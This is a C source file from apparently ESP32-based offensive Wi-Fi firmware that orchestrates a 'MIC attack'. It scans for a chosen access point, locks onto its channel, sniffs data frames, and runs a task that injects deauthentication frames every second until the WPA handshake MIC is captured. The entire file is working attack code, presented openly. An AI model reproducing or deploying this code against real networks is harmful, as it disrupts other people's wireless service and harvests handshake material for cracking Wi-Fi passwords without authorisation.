/*
 * @file arma_mic.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for orchestrating the MIC attack
 */

#include "arma_mic.h"

#include <stdio.h>
#include <string.h>

#include "arma_deauth.h"
#include "arma_utils.h"
#include "esp_err.h"
#include "esp_event.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static uint8_t u_target_bssid[6];
static char c_target_bssid[12];
static TaskHandle_t mic_deauth_inject_task_handle = NULL;

void arma_mic_set_target(char *target_bssid) {
  memcpy(c_target_bssid, target_bssid, 12);

  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }
  printf(
      "arma_mic.arma_mic_set_target > Target set AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
}

void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
               void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == MIC_BASED) {
    arma_mic_finishing_sequence();
    uint8_t *b = u_target_bssid;
    printf("{MIC,SUCCESS,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2], b[3],
           b[4], b[5]);
  }
}

void arma_mic_notif_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif, NULL));
  printf("arma_mic.arma_mic_notif_event_register > Registered mic_notif\n");
}

void arma_mic_notif_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif));
  printf("arma_mic.arma_mic_notif_event_unregister > Unregistered mic_notif\n");
}

void arma_mic_delete_task_deauth_inject() {
  if (mic_deauth_inject_task_handle != NULL) {
    vTaskDelete(mic_deauth_inject_task_handle);
    mic_deauth_inject_task_handle = NULL;
    printf(
        "arma_mic.arma_mic_delete_task_deauth_inject > Task "
        "arma_mic_inject_deauth was deleted\n");
  }
}

void arma_mic_finishing_sequence() {
  printf("{MIC,FINISHING_SEQUENCE,}\n");
  frame_parser_unregister_data_frame_handler();
  frame_parser_clear_target_parameter();
  arma_mic_delete_task_deauth_inject();
  arma_mic_notif_event_unregister();
  wifi_sniffer_stop();
}

void arma_mic_inject_deauth() {
  printf(
      "arma_mic.arma_mic_inject_deauth > Task arma_mic_inject_deauth was "
      "created\n");
  uint8_t *b = u_target_bssid;
  printf("{MIC,DEAUTH_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
         b[3], b[4], b[5]);
  int injected_deauth = 0;

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    arma_deauth_inject();
    printf("{MIC,INJECTED_DEAUTH,%d,}\n", injected_deauth);
    injected_deauth++;
  }
}

void arma_mic_launching_sequence(uint8_t channel) {
  printf("{MIC,LAUNCHING_SEQUENCE,}\n");
  frame_parser_set_target_parameter(u_target_bssid, PARSE_MIC);
  frame_parser_register_data_frame_handler();
  arma_mic_notif_event_register();
  wifi_sniffer_start();
  wifi_set_filter(DATA);
  wifi_set_channel(channel);
  arma_deauth_set_target(c_target_bssid);
  load_deauth_payload();
  xTaskCreatePinnedToCore(arma_mic_inject_deauth, TMDI_NAME, TMDI_STACK_SIZE,
                          NULL, TMDI_PRIORITY, &mic_deauth_inject_task_handle,
                          TMDI_CORE_ID);
}

void arma_mic(char *target_bssid) {
  arma_mic_set_target(target_bssid);
  wifi_scan_aps();

  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;
  printf("{MIC,FOUND_APS,%u,}\n", total_scanned_aps);

  uint8_t found_target_ap = 0;
  uint8_t index_of_target_ap = 0;
  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    uint8_t *bssid = ap_record.bssid;

    vTaskDelay(200 / portTICK_PERIOD_MS);

    printf("{MIC,SCAN,%02X%02X%02X%02X%02X%02X,", bssid[0], bssid[1], bssid[2],
           bssid[3], bssid[4], bssid[5]);
    print_string_into_hex(ap_record.ssid);
    printf("%d,%u,}\n", ap_record.rssi, ap_record.primary);

    if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
      found_target_ap = 1;
      index_of_target_ap = i;
    }
  }
  printf("{MIC,FINISH_SCAN,}\n");

  if (found_target_ap == 1) {
    wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
    uint8_t channel = ap_record.primary;

    printf("arma_mic.arma_mic > Target AP channel: %u\n", channel);
    arma_mic_launching_sequence(channel);
  } else if (found_target_ap == 0) {
    uint8_t *b = u_target_bssid;
    printf("{MIC,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
           b[3], b[4], b[5]);
  }
}